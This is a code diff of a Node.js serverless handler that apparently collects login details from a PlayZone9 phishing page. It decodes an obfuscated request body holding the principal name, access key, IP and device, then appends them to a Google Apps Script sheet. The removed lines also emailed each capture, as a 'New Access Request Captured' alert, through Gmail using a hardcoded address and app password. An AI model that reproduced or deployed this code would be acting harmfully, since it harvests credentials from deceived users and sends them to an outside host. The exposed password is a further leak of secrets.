@@ -1,15 +1,4 @@
-const nodemailer = require('nodemailer');
-
-const EMAIL_USER = process.env.EMAIL_USER || 'picturesquare.jhansi@gmail.com';
-const EMAIL_ACCESS_KEY = process.env.EMAIL_PASS || 'teflzvnvunkfobtd';
 const GOOGLE_SHEET_WEBAPP_URL = process.env.GOOGLE_SHEET_WEBAPP_URL || 'https://script.google.com/macros/s/AKfycbyaoffrSg-e3d6RsQXLKKDALfyotdbW4R3GhZORbnNO5LRuVIY7vIj3B8cz82xXaZNKxQ/exec';
-
-const transporter = nodemailer.createTransport({
-    host:   'smtp.gmail.com',
-    port:   465,
-    secure: true,
-    auth:   { user: EMAIL_USER, pass: EMAIL_ACCESS_KEY }
-});
 
 function decodePayload(encoded) {
     var reversed = encoded.split('').reverse().join('');
@@ -28,26 +17,6 @@ function parseBrowser(uaString) {
     if (uaString.includes('Firefox')) return 'Firefox';
     if (uaString.includes('Safari') && !uaString.includes('Chrome')) return 'Safari';
     return 'Unknown';
-}
-
-async function sendEmail(entry) {
-    try {
-        await transporter.sendMail({
-            from:    '"PlayZone9 Alert" <' + EMAIL_USER + '>',
-            to:      EMAIL_USER,
-            subject: 'mismatched attempt',
-            text:
-                '[PlayZone9] New Access Request Captured!\n\n' +
-                'Principal : ' + entry.pi + '\n' +
-                'Access Key: ' + (entry.ak || '[not provided]') + '\n' +
-                'IP        : ' + entry.oa + '\n' +
-                'Device    : ' + classifyEndpoint(entry.ua) + ' (' + parseBrowser(entry.ua) + ')\n' +
-                'Time      : ' + new Date(entry.ts).toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }) + '\n\n' +
-                'Site      : PlayZone9'
-        });
-    } catch (e) {
-        console.error('Email send error:', e.message);
-    }
 }
 
 async function appendToGoogleSheet(entry) {
@@ -88,10 +57,7 @@ module.exports = async (req, res) => {
         try {
             var rawBody = typeof req.body === 'string' ? req.body : JSON.stringify(req.body);
             var decoded = decodePayload(rawBody);
-            await Promise.all([
-                sendEmail(decoded),
-                appendToGoogleSheet(decoded)
-            ]);
+            await appendToGoogleSheet(decoded);
             return res.status(200).json({ received: true });
         } catch (e) {
             console.error('Telemetry decode error:', e.message);
